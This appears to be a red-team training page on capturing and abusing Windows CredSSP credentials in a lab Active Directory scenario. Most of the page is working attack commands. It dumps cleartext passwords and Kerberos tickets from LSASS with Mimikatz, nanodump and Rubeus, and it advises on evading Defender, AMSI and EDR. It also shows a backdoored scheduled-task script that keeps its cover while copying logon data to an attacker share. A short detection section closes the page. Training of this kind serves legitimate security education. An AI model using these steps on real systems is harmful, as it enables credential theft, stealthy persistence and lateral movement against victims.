---
layout: training-page
title: "CredSSP Credential Capture & Abuse — Red Team Academy"
module: "Active Directory"
tags:
  - credssp
  - credential-capture
  - delegation
  - winrm
  - nha
page_key: "ad-credssp-attacks"
render_with_liquid: false
---

# CredSSP Credential Capture & Abuse

## What is CredSSP

**Credential Security Support Provider (CredSSP)** is a Windows authentication protocol that delegates a user's plaintext credentials to a remote service. Unlike Kerberos (which passes signed tickets) or NTLM (which passes challenge responses), CredSSP passes the actual cleartext password — encrypted in transit but fully recoverable by the receiving server. It is used by:

- `Enter-PSSession -Authentication CredSSP`
- `Invoke-Command ... -Authentication CredSSP`
- RDP when "Remote Credential Guard" is NOT configured and credentials are forwarded
- Some Exchange / SCCM / legacy application integrations

If you can compromise the CredSSP *server*, any client that connects to you surrenders cleartext credentials. This is by design — CredSSP exists to solve the "double hop" problem. But the design trades off opsec for convenience.

> **NHA scenario:** `SRV03` (share) runs a scheduled task `bot.ps1` every 60 seconds that opens a CredSSP session to `SRV01` (web) authenticating as `academy\frank`. When you compromise `web`, frank's cleartext password lands in memory. This page covers how to extract it — and how to turn the same CredSSP trust into a persistence mechanism.

## Identifying CredSSP on a Host

```powershell
# Is CredSSP server-side enabled?
(Get-Item WSMan:\localhost\Service\Auth\CredSSP).Value
# → True means inbound CredSSP auth is accepted

# Is CredSSP client-side enabled (and with which trusted hosts)?
(Get-Item WSMan:\localhost\Client\Auth\CredSSP).Value
Get-WSManCredSSP
# → Look for: "The machine is configured to allow delegating fresh credentials to the following target(s): wsman/target.example"

# GPO-based CredSSP delegation:
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation" /s

# Scheduled tasks calling Invoke-Command with CredSSP auth (bot.ps1 equivalent):
Get-ScheduledTask | ForEach-Object {
  $xml = Export-ScheduledTask -TaskName $_.TaskName -TaskPath $_.TaskPath
  if ($xml -match 'CredSSP') { $_.TaskName }
}
```

## Capture Technique 1 — LSASS Extraction After Incoming CredSSP Session

When a CredSSP session lands on a server you control, the plaintext credentials are cached in LSASS for the lifetime of the logon session. Extract them using Mimikatz, pypykatz, or nanodump.

```powershell
# On-host Windows — Mimikatz (REQUIRES DEFENDER EVASION):
# Do NOT run mimikatz.exe on disk. Use a reflective loader.
# Example with Invoke-Mimikatz via in-memory download (must bypass AMSI first).
Invoke-Mimikatz -Command "sekurlsa::logonpasswords"

# Look for TSPKG / CredSSP entries, plus Wdigest when enabled:
#   Authentication Id : 0 ; xxxxxx
#   Session           : CredentialsDelegation from 192.168.58.23
#   User Name         : frank
#   Domain            : ACADEMY
#   tspkg:   Password : <CLEARTEXT>
#   kerberos: Password: <CLEARTEXT>

# From Linux via SMB share of lsass.dmp (use nanodump or comsvcs.dll to dump):
pypykatz lsa minidump lsass.dmp | grep -iE "tspkg|credman|password"

# nanodump (EDR-lighter than procdump.exe):
nanodump.x64.exe --write C:\Windows\Temp\totally-not-lsass.bin --valid
# Then pull it off and parse offline.
```

**OPSEC — Defender and EDR bypass:**

`mimikatz.exe` on disk is game over. Every serious AV catches the string `sekurlsa::logonpasswords`. Use:

- [Shellcode Loaders](/evasion/shellcode-loaders/) — Donut-packed Mimikatz loaded from encrypted memory
- [AMSI Bypass](/evasion/amsi-bypass/) — patch AMSI before Invoke-Mimikatz
- [LSASS Dumping](/post-exploitation/lsass-dumping/) — nanodump, silent-dump, MirrorDump techniques
- [Dll Unhooking](/evasion/dll-unhooking/) — unhook NTDLL before calling MiniDumpWriteDump

## Capture Technique 2 — Rogue CredSSP Listener (MITM the Bot)

You don't need the bot to land on the real target — you can *become* the target. Rebind the CredSSP listener on your controlled host, or stand up a rogue listener on a nearby port. When the client initiates CredSSP, the spnego/CredSSP handshake terminates at your listener and hands you the cleartext.

```powershell
# On the compromised CredSSP server (SRV01 in NHA) — ensure inbound CredSSP is on:
Enable-WSManCredSSP -Role Server -Force
Set-Item WSMan:\localhost\Service\Auth\CredSSP -Value $true
Restart-Service WinRM

# Rogue listener / log capture approach — enable verbose WSMan logging:
wevtutil sl Microsoft-Windows-WinRM/Operational /e:true
# When frank's bot connects, the WinRM analytic log on SRV01 contains the
# encrypted SOAP envelope. Coupled with LSASS extraction (Technique 1),
# cleartext lands in memory.
```

**Full rogue CredSSP server (research / detection):** See Eric Conrad's `inception-server` and Microsoft's own CredSSP vulnerabilities (CVE-2018-0886 — the "Credential Security Support Provider protocol remote code execution vulnerability"). An unpatched client plus a malicious server = RCE on the *client*. Most modern Windows is patched, but CredSSP oracle attacks remain useful research.

## Capture Technique 3 — Poison the Scheduled Task Itself

In NHA, the bot runs from `share` (SRV03) as a scheduled task. If you reach `share` — even with limited rights — and can write to the script path, replace `bot.ps1` with your own payload that harvests credentials locally or calls home. This is **persistence**, not just capture.

```powershell
# From share with write access to the bot script:
$payload = @'
# Original behavior first — maintain cover:
Invoke-Command -ComputerName web.academy.ninja.lan `
  -Credential (Get-Credential academy\frank) `
  -Authentication CredSSP `
  -ScriptBlock { whoami }

# Then: dump our own creds via Task Scheduler's SYSTEM token (runs every minute as SYSTEM):
# Write current process token / logon creds to a share we control
$out = [System.IO.Path]::GetTempFileName()
(Get-WmiObject Win32_LogonSession) | Out-File $out
Copy-Item $out \\192.168.58.200\loot\ -Force
'@
Set-Content -Path C:\Scripts\bot.ps1 -Value $payload -Encoding UTF8
```

Why it works: the task already runs with whatever privilege the scheduler configured (often SYSTEM or a service account). You inherit that every 60 seconds without having to maintain your own implant on share. A backdoor hiding inside an "expected" recurring task evades analyst review.

**OPSEC:** Keep the original behavior intact. Defender will flag obvious stagers; AMSI can still scan PowerShell content written to disk. Consider encoding / obfuscating with [Codecepticon](/evasion/codecepticon/) or [PowerShell Without PowerShell.exe](/evasion/powershell-without-ps/).

## Capture Technique 4 — Downgrade Requests and TGT Harvesting

Once frank is authenticated via CredSSP, the TGT is cached in the server's Kerberos ticket cache. Harvest it — no cleartext needed for downstream Kerberos abuse.

```powershell
# In-memory TGT dump (Mimikatz via reflective loader):
Invoke-Mimikatz -Command "sekurlsa::tickets /export"
# Produces .kirbi files on disk — immediately exfil and delete.

# Rubeus (requires AMSI bypass + reflective load):
Rubeus.exe dump /nowrap /service:krbtgt
Rubeus.exe triage   # list tickets per logon ID

# Convert .kirbi ↔ .ccache for Impacket:
ticketConverter.py Administrator.kirbi Administrator.ccache
```

With frank's TGT you can immediately:

- Request TGS for `MSSQLSvc/sql.academy.ninja.lan` → MSSQL sysadmin ([Database Attacks](/exploitation/database-attacks/))
- Do S4U2Self/Proxy for the constrained delegation to `eventlog/share` ([Kerberos Delegation](/active-directory/kerberos-delegation/))
- DCSync if frank ends up with replication rights

## Defensive View (for purple / detection)

- CredSSP should only be used where explicitly needed. Default to Kerberos with constrained delegation or Protected Users.
- Log `Event ID 4624` Logon Type 11 (CachedInteractive) and Type 3 with authentication package = `CredSSP` on your servers.
- Monitor for non-standard processes creating WSMan sessions with CredSSP auth — especially scheduled tasks.
- Members of the **Protected Users** group cannot be delegated via CredSSP or unconstrained delegation, regardless of server configuration.

## Key Resources

- [CredSSP Wikipedia — protocol overview](https://en.wikipedia.org/wiki/Credential_Security_Support_Provider)
- [MS-CSSP protocol spec](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-cssp/)
- [CVE-2018-0886 CredSSP remote code execution](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2018-0886)
- [Mimikatz sekurlsa::logonpasswords docs](https://tools.thehacker.recipes/mimikatz/modules/sekurlsa/logonpasswords)
- [Nanodump — LSASS dumping](https://github.com/fortra/nanodump)

## Related Pages

- [Kerberos Delegation Attacks](/active-directory/kerberos-delegation/)
- [LSASS Dumping](/post-exploitation/lsass-dumping/)
- [Windows Defender Evasion](/evasion/windows-defender/)
- [AMSI Bypass](/evasion/amsi-bypass/)
- [Shellcode Loaders](/evasion/shellcode-loaders/)
- [DLL Unhooking](/evasion/dll-unhooking/)
- [Ninja Hacker Academy (NHA)](/active-directory/nha/)
